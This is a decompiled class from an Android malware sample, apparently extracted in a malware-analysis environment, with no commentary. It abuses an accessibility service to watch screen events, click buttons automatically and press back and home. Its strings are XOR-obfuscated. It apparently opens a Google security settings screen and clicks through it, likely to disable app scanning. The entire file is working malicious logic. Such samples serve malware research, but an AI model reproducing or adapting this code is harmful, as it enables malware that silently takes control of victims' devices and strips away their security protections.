package com.zjxyxnvvp.nxvxchltf.i;

import android.content.ComponentName;
import android.content.Intent;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
import com.zjxyxnvvp.nxvxchltf.util.e;
import java.util.List;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class q {

    /* renamed from: a  reason: collision with root package name */
    public static boolean f330a = true;

    /* renamed from: b  reason: collision with root package name */
    public static long f331b;
    private static short[] $ = {871, 875, 873, 810, 867, 875, 875, 867, 872, 865, 810, 869, 874, 864, 886, 875, 877, 864, 810, 866, 877, 874, 887, 879, 893, 810, 880, 875, 875, 872, 870, 869, 886, 866, 886, 869, 873, 865, 883, 875, 886, 879, 810, 880, 875, 875, 872, 870, 869, 886, 887, 810, 887, 877, 873, 884, 872, 865, 880, 875, 875, 872, 870, 869, 886, 810, 882, 877, 865, 883, 810, 855, 877, 873, 884, 872, 865, 848, 875, 875, 872, 870, 869, 886, 895, 854, 850, 837, 854, 787, 853, 833, 860, 862, 787, 835, 863, 850, 842, 787, 835, 833, 860, 839, 854, 848, 839, 787, 5337, 5352, 5365, 5369, 5339, 5348, 5352, 5370, 4627, 4612, 4724, 4624, 4637, 4615, 4629, 4630, 4632, 4625, 4648, 4633, 4625, 4608, 4636, 4635, 4624, 4709, 9946, 9965, 9964, 9964, 9975, 9974, 3274, 3293, 3245, 3273, 3268, 3294, 3276, 3279, 3265, 3272, 3313, 3264, 3272, 3289, 3269, 3266, 3273, 3263, 8861, 8835, 8846, 8845, 8847, 8862, 8900, 8872, 8863, 8862, 8862, 8837, 8836, 1428, 1411, 1523, 1411, 1409, 1436, 1415, 1430, 1424, 1415, 1523, 1431, 1466, 1440, 1458, 1457, 1471, 1462, 1463, 2683, 2679, 2677, 2614, 2687, 2679, 2679, 2687, 2676, 2685, 2614, 2681, 2678, 2684, 2666, 2679, 2673, 2684, 2614, 2687, 2677, 2667, 246, 250, 248, 187, 242, 250, 250, 242, 249, 240, 187, 244, 251, 241, 231, 250, 252, 241, 187, 242, 248, 230, 187, 230, 240, 246, 224, 231, 252, 225, 236, 187, 230, 240, 225, 225, 252, 251, 242, 230, 187, 195, 240, 231, 252, 243, 236, 212, 229, 229, 230, 198, 240, 225, 225, 252, 251, 242, 230, 212, 246, 225, 252, 227, 252, 225, 236};
    public static b c = b.f333a;

    /* loaded from: /home/remnux/decompressedMalicious.dex */
    class a implements Runnable {

        /* renamed from: a  reason: collision with root package name */
        final /* synthetic */ UIDNwaidobaWIODb f332a;

        a(UIDNwaidobaWIODb uIDNwaidobaWIODb) {
            this.f332a = uIDNwaidobaWIODb;
        }

        @Override // java.lang.Runnable
        public void run() {
            this.f332a.performGlobalAction(1);
            this.f332a.performGlobalAction(1);
            this.f332a.performGlobalAction(1);
        }
    }

    /* loaded from: /home/remnux/decompressedMalicious.dex */
    public enum b {
        f333a,
        f334b,
        c;
        
        private static short[] $ = {155, 156, 137, 154, 156, 3190, 3177, 3196, 3191, 3196, 3197, 3174, 3178, 3196, 3181, 3181, 3184, 3191, 3198, 3178, 1289, 1286, 1283, 1289, 1281, 1295, 1294, 1301, 1305, 1289, 1291, 1284, 1301, 1291, 1306, 1306, 1305};

        private static String $(int i, int i2, int i3) {
            char[] cArr = new char[i2 - i];
            for (int i4 = 0; i4 < i2 - i; i4++) {
                cArr[i4] = (char) ($[i + i4] ^ i3);
            }
            return new String(cArr);
        }
    }

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static void a(UIDNwaidobaWIODb uIDNwaidobaWIODb, AccessibilityEvent accessibilityEvent) {
        if (!UIDNwaidobaWIODb.k) {
            int eventType = accessibilityEvent.getEventType();
            CharSequence className = accessibilityEvent.getClassName();
            if (eventType == 16384 && System.currentTimeMillis() - f331b > 3800 && className != null && className.equals($(0, 84, 772))) {
                if (Build.VERSION.SDK_INT >= 28) {
                    new Handler(Looper.getMainLooper()).postDelayed(new a(uIDNwaidobaWIODb), 250);
                }
                e.a($(84, 108, 819) + ((Object) accessibilityEvent.getPackageName()));
            } else if (eventType != 16384) {
                boolean s = com.zjxyxnvvp.nxvxchltf.util.b.s(accessibilityEvent);
                long currentTimeMillis = System.currentTimeMillis();
                if (currentTimeMillis - UIDNwaidobaWIODb.f < 25000 || com.zjxyxnvvp.nxvxchltf.util.b.r(uIDNwaidobaWIODb) || f330a) {
                    return;
                }
                if (s) {
                    b bVar = c;
                    b bVar2 = b.f333a;
                    String $2 = $(108, 116, 5261);
                    if (bVar == bVar2) {
                        for (AccessibilityNodeInfo accessibilityNodeInfo : com.zjxyxnvvp.nxvxchltf.util.b.b(UIDNwaidobaWIODb.i, $2)) {
                            CharSequence text = accessibilityNodeInfo.getText();
                            if (accessibilityNodeInfo.isClickable() && (text == null || text.toString().isEmpty())) {
                                accessibilityNodeInfo.performAction(16);
                                e.a($(116, 134, 4692));
                                c = b.f334b;
                            }
                        }
                        if (c == b.f333a) {
                            for (AccessibilityWindowInfo accessibilityWindowInfo : uIDNwaidobaWIODb.getWindows()) {
                                for (AccessibilityNodeInfo accessibilityNodeInfo2 : com.zjxyxnvvp.nxvxchltf.util.b.b(accessibilityWindowInfo.getRoot(), $(134, 140, 9880))) {
                                    CharSequence contentDescription = accessibilityNodeInfo2.getContentDescription();
                                    if (accessibilityNodeInfo2.isClickable() && contentDescription != null && contentDescription.toString().length() > 0) {
                                        Rect rect = new Rect();
                                        accessibilityNodeInfo2.getBoundsInScreen(rect);
                                        if (rect.left > 50) {
                                            accessibilityNodeInfo2.performAction(16);
                                            e.a($(140, 158, 3213));
                                            c = b.f334b;
                                        }
                                    }
                                }
                            }
                        }
                    } else if (c == b.f334b) {
                        List<AccessibilityNodeInfo> b2 = com.zjxyxnvvp.nxvxchltf.util.b.b(UIDNwaidobaWIODb.i, $2);
                        if (b2.size() >= 2) {
                            uIDNwaidobaWIODb.c(b2.get(1));
                            c = b.c;
                        }
                    } else if (c == b.c) {
                        List<AccessibilityNodeInfo> b3 = com.zjxyxnvvp.nxvxchltf.util.b.b(UIDNwaidobaWIODb.i, $(158, 171, 8938));
                        if (b3.size() >= 2) {
                            b3.get(1).performAction(16);
                            f330a = true;
                            e.a($(171, 190, 1491));
                            c = b.f333a;
                            uIDNwaidobaWIODb.performGlobalAction(1);
                            uIDNwaidobaWIODb.performGlobalAction(1);
                            uIDNwaidobaWIODb.performGlobalAction(2);
                        }
                    }
                } else if (currentTimeMillis - f331b > 5000) {
                    f331b = currentTimeMillis;
                    b(uIDNwaidobaWIODb);
                }
            }
        }
    }

    public static void b(UIDNwaidobaWIODb uIDNwaidobaWIODb) {
        Intent intent = new Intent();
        c = b.f333a;
        intent.setComponent(new ComponentName($(190, 212, 2584), $(212, 279, 149)));
        intent.addFlags(268435456);
        uIDNwaidobaWIODb.startActivity(intent);
    }
}
